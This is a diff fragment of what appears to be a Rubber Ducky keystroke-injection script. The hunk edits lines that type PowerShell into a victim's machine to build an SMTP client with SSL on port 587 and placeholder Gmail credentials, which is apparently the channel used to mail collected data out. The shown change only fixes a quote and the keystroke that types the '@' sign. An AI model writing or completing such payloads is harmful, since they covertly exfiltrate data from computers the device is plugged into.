@@ -102,7 +102,7 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL ADRESS BEFEORE @'
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL ADRESS BEFEORE @
 SHIFT 2
 STRING gmail.com', 'PASSWORD TO YOUR EMAIL');
 ENTER
